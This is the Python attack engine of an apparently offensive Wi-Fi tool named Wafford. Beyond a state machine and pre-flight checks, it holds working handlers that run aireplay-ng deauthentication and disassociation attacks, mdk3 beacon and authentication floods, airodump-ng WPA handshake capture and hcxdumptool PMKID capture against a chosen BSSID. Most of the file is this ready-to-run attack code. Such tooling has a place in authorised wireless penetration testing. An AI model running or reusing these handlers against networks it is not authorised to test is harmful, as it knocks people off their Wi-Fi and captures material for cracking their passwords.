"""Attack engine, event bus, and state machine for Wafford."""

from __future__ import annotations

import enum
import logging
import os
import shutil
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Any

from wafford.constants import REQUIRED_TOOLS, TOOL_PATHS, AttackType
from wafford.core.base import Event, EventBus

if TYPE_CHECKING:
    import asyncio

logger = logging.getLogger(__name__)


# ── Attack state ──────────────────────────────────────────────────────────────

class AttackState(enum.Enum):
    IDLE = "idle"
    PREPARING = "preparing"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


_VALID_TRANSITIONS: dict[AttackState, set[AttackState]] = {
    AttackState.IDLE: {AttackState.PREPARING},
    AttackState.PREPARING: {
        AttackState.RUNNING, AttackState.FAILED, AttackState.CANCELLED
    },
    AttackState.RUNNING: {
        AttackState.PAUSED, AttackState.COMPLETED,
        AttackState.FAILED, AttackState.CANCELLED,
    },
    AttackState.PAUSED: {AttackState.RUNNING, AttackState.CANCELLED},
    AttackState.COMPLETED: set(),
    AttackState.FAILED: {AttackState.IDLE},
    AttackState.CANCELLED: {AttackState.IDLE},
}


# ── Attack result ─────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    """Outcome of a single attack run."""

    success: bool = False
    state: AttackState = AttackState.IDLE
    packets_sent: int = 0
    duration_sec: float = 0.0
    message: str = ""
    data: dict[str, Any] = field(default_factory=dict)
    error: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "success": self.success,
            "state": self.state.value,
            "packets_sent": self.packets_sent,
            "duration_sec": self.duration_sec,
            "message": self.message,
            "data": self.data,
            "error": self.error,
        }


# ── Safety checks ─────────────────────────────────────────────────────────────

@dataclass
class SafetyCheck:
    """Result of a single pre-flight check."""

    name: str
    passed: bool
    detail: str = ""


class AttackEngine:
    """Manages attack lifecycle: state machine, pre-flight safety, and event emission."""

    def __init__(self, bus: EventBus | None = None) -> None:
        self._bus = bus or EventBus.get()
        self._state = AttackState.IDLE
        self._current_task: asyncio.Task[AttackResult] | None = None
        self._start_time: float = 0.0
        self._paused_at: float = 0.0
        self._paused_total: float = 0.0
        self._attack_id: int | None = None
        self._attack_type: AttackType | None = None

    @property
    def bus(self) -> EventBus:
        return self._bus

    @property
    def state(self) -> AttackState:
        return self._state

    @property
    def attack_id(self) -> int | None:
        return self._attack_id

    # ── State transitions ────────────────────────────────────────────────
    def _transition(self, new_state: AttackState) -> None:
        allowed = _VALID_TRANSITIONS.get(self._state, set())
        if new_state not in allowed:
            msg = f"Invalid transition: {self._state.value} -> {new_state.value}"
            logger.error(msg)
            raise ValueError(msg)
        old = self._state
        self._state = new_state
        logger.debug("State: %s -> %s", old.value, new_state.value)
        self._bus.emit(Event("engine", "state_change", {"old": old.value, "new": new_state.value}))

    # ── Pre-flight safety checks ─────────────────────────────────────────
    def validate_preconditions(
        self,
        interface: str,
        target_bssid: str | None = None,
        attack_type: AttackType | None = None,
    ) -> list[SafetyCheck]:
        checks: list[SafetyCheck] = []

        # Root check
        is_root = os.geteuid() == 0
        checks.append(SafetyCheck(
            name="root_privileges",
            passed=is_root,
            detail="" if is_root else "Must run as root",
        ))

        # Required tools
        missing_tools = []
        for tool in REQUIRED_TOOLS:
            path = TOOL_PATHS.get(tool, f"/usr/bin/{tool}")
            if not shutil.which(tool) and not Path(path).is_file():
                missing_tools.append(tool)
        checks.append(SafetyCheck(
            name="required_tools",
            passed=len(missing_tools) == 0,
            detail=f"Missing: {', '.join(missing_tools)}" if missing_tools else "",
        ))

        # Interface exists
        iface_path = Path(f"/sys/class/net/{interface}")
        iface_exists = iface_path.is_dir()
        checks.append(SafetyCheck(
            name="interface_exists",
            passed=iface_exists,
            detail=f"Interface '{interface}' not found" if not iface_exists else "",
        ))

        # Interface is wireless
        is_wireless = (iface_path / "wireless").is_dir() if iface_exists else False
        checks.append(SafetyCheck(
            name="interface_wireless",
            passed=is_wireless,
            detail=(
                f"Interface '{interface}' is not wireless"
                if iface_exists and not is_wireless else ""
            ),
        ))

        # Monitor mode check (needed for most attacks)
        if attack_type and attack_type not in (AttackType.CAPTIVE_PORTAL, AttackType.EVIL_TWIN):
            mode_file = iface_path / "type"
            in_monitor = False
            if mode_file.is_file():
                try:
                    with mode_file.open() as f:
                        in_monitor = f.read().strip() == "803"
                except OSError:
                    pass
            checks.append(SafetyCheck(
                name="monitor_mode",
                passed=in_monitor,
                detail=f"Interface '{interface}' not in monitor mode" if not in_monitor else "",
            ))

        # Target BSSID validation
        if target_bssid:
            import re
            valid_bssid = bool(re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", target_bssid))
            checks.append(SafetyCheck(
                name="target_bssid",
                passed=valid_bssid,
                detail=f"Invalid BSSID: {target_bssid}" if not valid_bssid else "",
            ))

        # Channel check
        if iface_exists:
            channel_file = iface_path / "wireless" / "channel"
            has_channel = channel_file.is_file()
            checks.append(SafetyCheck(
                name="channel_set",
                passed=has_channel,
                detail=(
                    "Could not read channel (interface may need monitor mode)"
                    if not has_channel else ""
                ),
            ))

        return checks

    def all_checks_passed(self, checks: list[SafetyCheck]) -> bool:
        return all(c.passed for c in checks)

    # ── Engine control ───────────────────────────────────────────────────
    async def run(
        self,
        attack_type: AttackType,
        interface: str,
        target_bssid: str,
        target_essid: str = "",
        attack_id: int | None = None,
        **kwargs: Any,
    ) -> AttackResult:
        """Execute an attack through the state machine."""
        import asyncio

        if self._state not in (
            AttackState.IDLE, AttackState.COMPLETED,
            AttackState.FAILED, AttackState.CANCELLED,
        ):
            raise ValueError(f"Cannot start attack in state {self._state.value}")

        current_task = asyncio.current_task()
        self._current_task = current_task  # allows cancel() to stop an active run
        self._attack_id = attack_id
        self._attack_type = attack_type
        self._paused_total = 0.0

        self._transition(AttackState.PREPARING)
        self._start_time = time.monotonic()
        self._bus.emit(Event("engine", "attack_start", {
            "attack_type": attack_type.value, "interface": interface,
            "target_bssid": target_bssid, "target_essid": target_essid,
        }))

        # Pre-flight checks
        checks = self.validate_preconditions(interface, target_bssid, attack_type)
        if not self.all_checks_passed(checks):
            failures = [c for c in checks if not c.passed]
            error_msg = "; ".join(f"{c.name}: {c.detail}" for c in failures)
            logger.warning("Pre-flight checks failed: %s", error_msg)
            self._transition(AttackState.FAILED)
            return AttackResult(
                success=False,
                state=self._state,
                message="Pre-flight checks failed",
                error=error_msg,
            )

        self._transition(AttackState.RUNNING)

        result = AttackResult(state=self._state)
        try:
            result = await self._execute_attack(
                attack_type, interface, target_bssid, target_essid, **kwargs
            )
            if result.success:
                self._transition(AttackState.COMPLETED)
            else:
                self._transition(AttackState.FAILED)
            result.state = self._state
            result.duration_sec = time.monotonic() - self._start_time - self._paused_total
            self._bus.emit(Event("engine", "attack_complete", result.to_dict()))
        except asyncio.CancelledError:
            if self._state != AttackState.CANCELLED:
                self._transition(AttackState.CANCELLED)
            result.success = False
            result.state = AttackState.CANCELLED
            result.message = "Attack cancelled by user"
            result.duration_sec = time.monotonic() - self._start_time - self._paused_total
            self._bus.emit(Event("engine", "attack_cancelled", result.to_dict()))
        except Exception as exc:
            result.success = False
            result.error = str(exc)
            result.state = self._state
            logger.exception("Attack failed")
            self._transition(AttackState.FAILED)
            result.state = self._state
            self._bus.emit(Event("engine", "attack_failed", {**result.to_dict(), "error": str(exc)}))
        finally:
            self._current_task = None

        return result

    async def _execute_attack(
        self,
        attack_type: AttackType,
        interface: str,
        target_bssid: str,
        target_essid: str,
        **kwargs: Any,
    ) -> AttackResult:
        """Dispatch to the appropriate attack handler."""

        result = AttackResult()

        if attack_type == AttackType.DEAUTH:
            count = kwargs.get("count", 5)
            result = await self._run_deauth(interface, target_bssid, count)
        elif attack_type == AttackType.DISASSOC:
            count = kwargs.get("count", 5)
            result = await self._run_disassoc(interface, target_bssid, count)
        elif attack_type == AttackType.BEACON:
            result = await self._run_beacon(interface, target_essid or "FreeWiFi")
        elif attack_type == AttackType.AUTH:
            result = await self._run_auth_flood(interface, target_bssid)
        elif attack_type == AttackType.HANDSHAKE:
            result = await self._run_handshake_capture(interface, target_bssid, **kwargs)
        elif attack_type == AttackType.PMKID:
            result = await self._run_pmkid(interface, target_bssid)
        elif attack_type == AttackType.INJECTION:
            result = await self._run_injection_test(interface, target_bssid)
        else:
            result.message = f"Attack type {attack_type.value} not yet implemented"
            result.success = False
        return result

    # ── Attack implementations ───────────────────────────────────────────
    async def _run_deauth(self, interface: str, bssid: str, count: int) -> AttackResult:
        import asyncio

        result = AttackResult()
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        logger.info("Running: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        result.packets_sent = count
        result.duration_sec = time.monotonic() - self._start_time
        result.success = proc.returncode == 0
        result.message = stdout.decode(errors="replace").strip()
        if proc.returncode != 0:
            result.error = stderr.decode(errors="replace").strip()
        return result

    async def _run_disassoc(self, interface: str, bssid: str, count: int) -> AttackResult:
        import asyncio

        result = AttackResult()
        cmd = ["aireplay-ng", "--disassoc", str(count), "-a", bssid, interface]
        logger.info("Running: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        result.packets_sent = count
        result.duration_sec = time.monotonic() - self._start_time
        result.success = proc.returncode == 0
        result.message = stdout.decode(errors="replace").strip()
        if proc.returncode != 0:
            result.error = stderr.decode(errors="replace").strip()
        return result

    async def _run_beacon(self, interface: str, essid: str) -> AttackResult:
        import asyncio

        result = AttackResult()
        cmd = ["mdk3", interface, "b", "-n", essid]
        logger.info("Running: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.sleep(10)
        proc.terminate()
        await proc.wait()
        result.success = True
        result.message = f"Beacon flood started with ESSID '{essid}'"
        result.duration_sec = time.monotonic() - self._start_time
        return result

    async def _run_auth_flood(self, interface: str, bssid: str) -> AttackResult:
        import asyncio

        result = AttackResult()
        cmd = ["mdk3", interface, "a", "-c", "0", "-b", bssid]
        logger.info("Running: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.sleep(10)
        proc.terminate()
        await proc.wait()
        result.success = True
        result.message = f"Authentication flood targeting {bssid}"
        result.duration_sec = time.monotonic() - self._start_time
        return result

    async def _run_handshake_capture(
        self, interface: str, bssid: str, **kwargs: Any,
    ) -> AttackResult:
        import asyncio

        channel = kwargs.get("channel", 0)
        output = kwargs.get(
            "output",
            f"/tmp/wafford_{bssid.replace(':', '_')}",  # noqa: S108
        )
        timeout = kwargs.get("timeout", 60)
        result = AttackResult()

        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--write", output,
            "--output-format", "cap",
            interface,
        ]
        if channel:
            cmd.insert(1, "--channel")
            cmd.insert(2, str(channel))

        logger.info("Running: %s", " ".join(cmd))
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        try:
            await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except TimeoutError:
            proc.terminate()
            await proc.wait()

        result.duration_sec = time.monotonic() - self._start_time
        result.success = True
        result.message = f"Handshake capture completed for {bssid}"
        result.data = {"output_file": f"{output}-01.cap"}
        return result

    async def _run_pmkid(self, interface: str, bssid: str) -> AttackResult:
        import asyncio

        result = AttackResult()
        cmd = [
            "hcxdumptool", "-i", interface, "--filterlist", bssid,
            "--filtermode=2", "-o", "/tmp/pmkid.pcapng",  # noqa: S108
        ]
        logger.info("Running PMKID attack: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            await asyncio.wait_for(proc.communicate(), timeout=30)
        except TimeoutError:
            proc.terminate()
            await proc.wait()

        result.success = proc.returncode in (0, None)
        result.duration_sec = time.monotonic() - self._start_time
        result.message = "PMKID capture completed"
        result.data = {"output_file": "/tmp/pmkid.pcapng"}  # noqa: S108
        return result

    async def _run_injection_test(self, interface: str, _bssid: str) -> AttackResult:
        import asyncio  # noqa: PLC0415

        result = AttackResult()
        cmd = ["aireplay-ng", "--test", interface]
        logger.info("Running: %s", " ".join(cmd))

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        result.duration_sec = time.monotonic() - self._start_time
        output = stdout.decode(errors="replace") + stderr.decode(errors="replace")
        result.success = "100% injection" in output or "injection is working" in output.lower()
        result.message = output.strip()
        return result

    # ── Pause / Resume / Cancel ──────────────────────────────────────────
    def pause(self) -> None:
        if self._state != AttackState.RUNNING:
            raise ValueError("Can only pause a running attack")
        self._transition(AttackState.PAUSED)
        self._paused_at = time.monotonic()
        self._bus.emit(Event("engine", "attack_paused", {}))

    def resume(self) -> None:
        if self._state != AttackState.PAUSED:
            raise ValueError("Can only resume a paused attack")
        if self._paused_at:
            self._paused_total += time.monotonic() - self._paused_at
        self._transition(AttackState.RUNNING)
        self._bus.emit(Event("engine", "attack_resumed", {}))

    def cancel(self) -> None:
        if self._state in (AttackState.COMPLETED, AttackState.FAILED, AttackState.CANCELLED):
            return
        if self._current_task and not self._current_task.done():
            self._current_task.cancel()
        self._transition(AttackState.CANCELLED)
        self._bus.emit(Event("engine", "attack_cancelled", {}))

    def reset(self) -> None:
        self._state = AttackState.IDLE
        self._current_task = None
        self._start_time = 0.0
        self._paused_at = 0.0
        self._paused_total = 0.0
        self._attack_id = None
        self._attack_type = None
        self._bus.emit(Event("engine", "engine_reset", {}))

    def status(self) -> dict[str, Any]:
        elapsed = 0.0
        if self._start_time and self._state in (AttackState.RUNNING, AttackState.PAUSED):
            base = self._paused_at if self._paused_at else time.monotonic()
            elapsed = base - self._start_time - self._paused_total
        return {
            "state": self._state.value,
            "attack_id": self._attack_id,
            "attack_type": self._attack_type.value if self._attack_type else None,
            "elapsed_sec": round(elapsed, 2),
        }
